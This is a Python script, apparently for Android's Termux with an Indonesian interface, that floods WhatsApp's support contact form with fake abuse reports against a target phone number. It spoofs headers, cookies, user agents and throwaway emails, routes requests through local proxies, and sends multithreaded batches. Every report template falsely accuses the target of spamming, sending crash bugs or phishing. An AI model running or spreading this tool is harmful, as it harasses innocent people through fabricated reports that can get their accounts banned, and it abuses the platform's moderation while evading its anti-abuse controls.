import os
import subprocess
import requests
import random
import time
import threading
from datetime import datetime, timedelta
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from fake_useragent import UserAgent
from rich.live import Live
from rich.text import Text
import string
import json

console = Console()
limit_hours = 10
log_file = "hs.txt"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def stp(port):
    if not os.path.exists("/data/data/com.termux/files/usr/bin/tinyproxy"):
        os.system("pkg install tinyproxy -y")
    config_path = f"/data/data/com.termux/files/usr/etc/tinyproxy_{port}.conf"
    if not os.path.exists(config_path):
        os.system(f"echo 'Port {port}\nAllow 127.0.0.1' > {config_path}")
    subprocess.Popen(["tinyproxy", "-c", config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    return f"127.0.0.1:{port}"

def vp(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get(test_url, proxies=proxies, timeout=10)
        return r.status_code == 200
    except:
        return False

def rua():
    return UserAgent().random

def rc():
    csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    return {
        'wa_csrf': csrf_token,
        'wa_lang_pref': 'id',
        'wa_ul': session_id
    }

def rs(length=10):
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length))

def sr(pn, proxies):
    url = 'https://www.whatsapp.com/contact/noclient/async/new/'
    pesan_variatif = [
        f"Nomer ini [ +62{pn} ] Melakukan SPAMING berlebihan menggunakan bot, mohon di beri peringatan segera!",
        f"Nomer ini [ +62{pn} ] Melakukan penyalah gunaan whatsapp dengan menggunakan bot yang di modifikasi agar daoat mengirimkan bug ke nomer saya hingga whatsapp saya crash, Mohon di beri sanksi!",
        f"Nomer ini [ +62{pn} ] Melakukan tindakan yang tidak seharusnya di lakukan, Pengguna ini melakukan pengiriman pesan yang merusak whatsapp saya, Tolong di periksa dan di beri tindakan yang seharusnya di dapat.",
        f"Nomer ini [ +62{pn} ] Melakukan pengiriman pesan dengan memberi link ke akun saya yang ternyata link itu adalah sebuah phising, link tersebut adalah https://mfacebookcom.vercel.app/ Mohon di beri sanksi segera!"
    ]
    headers = {
        'authority': 'www.whatsapp.com',
        'accept': '*/*',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.whatsapp.com',
        'referer': 'https://www.whatsapp.com/contact/?subject=messenger',
        'sec-ch-ua': f'"{random.choice(["Not-A.Brand", "Chromium"])}";v="{random.randint(90, 99)}", "Chromium";v="{random.randint(110, 124)}"',
        'sec-ch-ua-mobile': random.choice(['?0', '?1']),
        'sec-ch-ua-platform': f'"{random.choice(["Windows", "Android", "iOS"])}"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': rua(),
        'x-asbd-id': str(random.randint(100000, 999999)),
        'x-fb-lsd': 'AVoCvX9IGCU'
    }

    proxy = random.choice(proxies)
    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    data = {
        'country_selector': 'ID',
        'email': f'{rs()}@tempmail.com',
        'email_confirm': f'{rs()}@tempmail.com',
        'phone_number': pn,
        'platform': random.choice(['WHATS_APP_WEB_DESKTOP', 'WHATS_APP_ANDROID']),
        'your_message': random.choice(pesan_variatif),
        'step': 'submit',
    }

    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxies_dict, cookies=rc(), timeout=10)
        if response.status_code == 200:
            console.print(f"\n[bold cyan]╭───────────╯\n╰─> [ BERHASIL SPAM RIPORT ] : +62{pn}[/bold cyan]")
        else:
            console.print(f"\n[bold red]╭───────────╯\n╰─> [ TERJADI KESALAHAN : {response.status_code} ][/bold red]")
    except Exception as e:
        console.print(f"\n[bold red]╭───────────╯\n╰─> [ TERJADI KESALAHAN : {e} ][/bold red]")

def load_log():
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            try:
                return json.load(f)
            except:
                return {}
    return {}

def save_log(pn):
    log_data = load_log()
    log_data[pn] = datetime.now().isoformat()
    with open(log_file, "w") as f:
        json.dump(log_data, f)

def countdown_and_restart(sisa_waktu):
    total = int(sisa_waktu.total_seconds())
    try:
        with Live(refresh_per_second=1, console=console) as live:
            while total > 0:
                jam, sisa = divmod(total, 3600)
                menit, detik = divmod(sisa, 60)
                teks = Text(f"╭───────────╯\n╰─> [ SPAM LAGI DALAM ] : {jam:02}:{menit:02}:{detik:02}", style="bold yellow")
                live.update(teks)
                time.sleep(1)
                total -= 1
        console.print("\n[bold green]╭───────────╯\n╰─> [ START SPAM REPORT ][/bold green]\n")
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]╭───────────╯\n╰─> [ DIHENTIKAN ][/bold red]")

def main():
    clear()
    console.print(Panel("[bold red]██████╗  ██╗ ███████╗  █████╗   █████╗   █████╗\n██╔══██╗ ██║ ╚══███╔╝ ██╔══██╗ ██╔══██╗ ██╔══██╗\n██║  ██║ ██║   ███╔╝  ╚██████║ ╚██████║ ╚██████║\n[bold white]██║  ██║ ██║  ███╔╝    ╚═══██║  ╚═══██║  ╚═══██║\n██████╔╝ ██║ ███████╗  █████╔╝  █████╔╝  █████╔╝\n╚═════╝  ╚═╝ ╚══════╝  ╚════╝   ╚════╝   ╚════╝\n\n[bold red]● [bold yellow]● [bold green]●\n[bold red]────────────────────────────────────────────────‎\n[bold yellow]-----● SCRIPT SPAM RIPORT ●-----[/bold yellow]\n\n[bold green]PEMBUAT : DIZ FLYZE 999\nYOUTUBE : DIZFLYZE999\nVERSION : v999 KING SPAM REPORT[/bold green]\n[bold red]──────────────────────────────────────────────── ‎", style="bold red"))
    console.print(Panel("[bold yellow]MASUKAN NOMOR TARGET DENGAN 8XXX\nINGAT JANGAN SPAM BERLEBIHAN!\nSCRIPT INI MUDAH DOWN JADI SPAM REPORT\n1 HARI 5X SPAM RIPORT KE NOMOR YANG SAMA", style="bold red"))
    console.print("[bold cyan]╭───────────────────────────────────────────────────")
    pn = console.input("[bold cyan]╰─> [ NOMER TARGET ] : [/bold cyan]")

    if not pn.isdigit() or not pn.startswith("8") or len(pn) < 9:
        console.print("[bold red]╰─> [ MASUKAN NOMER DENGAN BENAR! AWALI 8XX ][/bold red]")
        return

    log_data = load_log()
    if pn in log_data:
        last_spam = datetime.fromisoformat(log_data[pn])
        waktu_sisa = timedelta(hours=limit_hours) - (datetime.now() - last_spam)
        if waktu_sisa.total_seconds() > 0:
            countdown_and_restart(waktu_sisa)
            return

    save_log(pn)

    ports = [8888 + i for i in range(10)]
    proxies_list = []
    for port in ports:
        proxy = stp(port)
        if vp(proxy):
            proxies_list.append(proxy)

    if not proxies_list:
        console.print("[bold red]PROXY MATI SEMUA SERVER OFF[/bold red]")
        return

    def spam_job():
        sr(pn, proxies_list)

    with Progress() as progress:
        task = progress.add_task("[cyan]PROSES BANG |", total=10)
        threads = []
        for _ in range(10):
            t = threading.Thread(target=spam_job)
            t.start()
            threads.append(t)
            progress.update(task, advance=1)
            time.sleep(random.randint(1, 5))
        for t in threads:
            t.join()

    countdown_and_restart(timedelta(hours=limit_hours))

main()
